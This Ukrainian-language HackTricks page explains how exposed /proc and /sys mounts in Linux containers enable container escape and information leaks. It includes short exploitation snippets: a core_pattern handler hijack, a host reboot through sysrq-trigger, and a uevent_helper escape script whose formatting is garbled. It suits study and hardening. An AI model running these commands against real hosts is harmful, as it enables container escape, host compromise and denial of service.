# Чутливі монти

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання AWS Red Team Expert (ARTE) від HackTricks**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання GCP Red Team Expert (GRTE) від HackTricks**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Викладення `/proc` та `/sys` без належної ізоляції простору імен створює значні ризики безпеки, включаючи збільшення поверхні атак та розголошення інформації. Ці каталоги містять чутливі файли, які, якщо неправильно налаштовані або доступні для несанкціонованого користувача, можуть призвести до втечі контейнера, модифікації хоста або надання інформації, яка допоможе в подальших атаках. Наприклад, неправильне монтування `-v /proc:/host/proc` може обійти захист AppArmor через його шляхову природу, залишаючи `/host/proc` незахищеним.

**Ви можете знайти додаткові деталі щодо кожної потенційної уразливості за посиланням** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Уразливості procfs

### `/proc/sys`

Цей каталог дозволяє змінювати ядерні змінні, зазвичай через `sysctl(2)`, і містить кілька підкаталогів, що викликають занепокоєння:

#### **`/proc/sys/kernel/core_pattern`**

* Описано в [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Дозволяє визначити програму для виконання при генерації файлу ядра з першими 128 байтами як аргументами. Це може призвести до виконання коду, якщо файл починається з каналу `|`.
*   **Приклад тестування та експлуатації**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Перевірка доступу на запис
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Встановлення власного обробника
sleep 5 && ./crash & # Запуск обробника
```

#### **`/proc/sys/kernel/modprobe`**

* Детально описано в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Містить шлях до завантажувача ядра модулів, який викликається для завантаження ядерних модулів.
*   **Приклад перевірки доступу**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Перевірка доступу до modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Згадується в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Глобальний прапорець, який контролює, чи викликати паніку ядра, чи викликати вбивцю OOM при виникненні умови OOM.

#### **`/proc/sys/fs`**

* Згідно з [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), містить параметри та інформацію про файлову систему.
* Доступ на запис може дозволити різноманітні атаки відмови обслуговування проти хоста.

#### **`/proc/sys/fs/binfmt_misc`**

* Дозволяє реєструвати інтерпретатори для неіноземних бінарних форматів на основі їх магічного числа.
* Може призвести до підвищення привілеїв або доступу до оболонки root, якщо `/proc/sys/fs/binfmt_misc/register` доступний для запису.
* Відповідний експлойт та пояснення:
* [Rootkit від простої людини через binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Підробиці уроку: [Посилання на відео](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Інші в `/proc`

#### **`/proc/config.gz`**

* Може розкрити конфігурацію ядра, якщо `CONFIG_IKCONFIG_PROC` увімкнено.
* Корисно для зловмисників для виявлення вразливостей у робочому ядрі.

#### **`/proc/sysrq-trigger`**

* Дозволяє викликати команди Sysrq, що потенційно можуть призвести до негайних перезавантажень системи або інших критичних дій.
*   **Приклад перезавантаження хоста**:

```bash
echo b > /proc/sysrq-trigger # Перезавантажує хост
```

#### **`/proc/kmsg`**

* Відкриває повідомлення кільцевого буфера ядра.
* Може допомогти в експлойтах ядра, витоках адрес та наданні чутливої системної інформації.

#### **`/proc/kallsyms`**

* Перераховує експортовані символи ядра та їх адреси.
* Необхідний для розробки експлойтів ядра, особливо для подолання KASLR.
* Інформація про адресу обмежена з `kptr_restrict`, встановленим на `1` або `2`.
* Деталі в [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Взаємодіє з пристроєм пам'яті ядра `/dev/mem`.
* Історично вразливий до атак підвищення привілеїв.
* Докладніше у [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Представляє фізичну пам'ять системи у форматі ядра ELF.
* Читання може витікати вміст пам'яті хоста та інших контейнерів.
* Великий розмір файлу може призвести до проблем з читанням або аварійної зупинки програмного забезпечення.
* Докладне використання у [Вивантаження /proc/kcore в 2019 році](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Альтернативний інтерфейс для `/dev/kmem`, що представляє віртуальну пам'ять ядра.
* Дозволяє читання та запис, отже пряме змінення пам'яті ядра.

#### **`/proc/mem`**

* Альтернативний інтерфейс для `/dev/mem`, що представляє фізичну пам'ять.
* Дозволяє читання та запис, для зміни всієї пам'яті потрібно розробити віртуальні адреси.

#### **`/proc/sched_debug`**

* Повертає інформацію про планування процесів, обходячи захист PID простору імен.
* Розкриває назви процесів, ідентифікатори та ідентифікатори cgroup.

#### **`/proc/[pid]/mountinfo`**

* Надає інформацію про точки монтування в просторі імен процесу.
* Розкриває місце розташування `rootfs` або зображення контейнера.

### Уразливості `/sys`

#### **`/sys/kernel/uevent_helper`**

* Використовується для обробки подій ядра `uevents`.
* Запис до `/sys/kernel/uevent_helper` може виконати довільні скрипти при спрацюванні `uevent`.
*   **Приклад експлуатації**: %%%bash

#### Створює навантаження

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Знаходить шлях хоста з монтування OverlayFS для контейнера

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Встановлює uevent\_helper на шкідливий помічник

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### Запускає подію uevent

echo change > /sys/class/mem/null/uevent

#### Читає вивід

cat /output %%%
#### **`/sys/class/thermal`**

* Контролює налаштування температури, потенційно спричиняючи атаки DoS або фізичні пошкодження.

#### **`/sys/kernel/vmcoreinfo`**

* Витікає адреси ядра, потенційно компрометуючи KASLR.

#### **`/sys/kernel/security`**

* Містить інтерфейс `securityfs`, що дозволяє налаштування модулів безпеки Linux, таких як AppArmor.
* Доступ може дозволити контейнеру вимкнути свою систему MAC.

#### **`/sys/firmware/efi/vars` та `/sys/firmware/efi/efivars`**

* Викриває інтерфейси для взаємодії зі змінними EFI в NVRAM.
* Неправильна конфігурація або експлуатація може призвести до "кирпатих" ноутбуків або незавантажуваних хост-машин.

#### **`/sys/kernel/debug`**

* `debugfs` пропонує інтерфейс налагодження "без правил" для ядра.
* Історія проблем з безпекою через його необмежений характер.

### References

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Вивчайте та практикуйте хакінг AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте хакінг GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або групи **telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
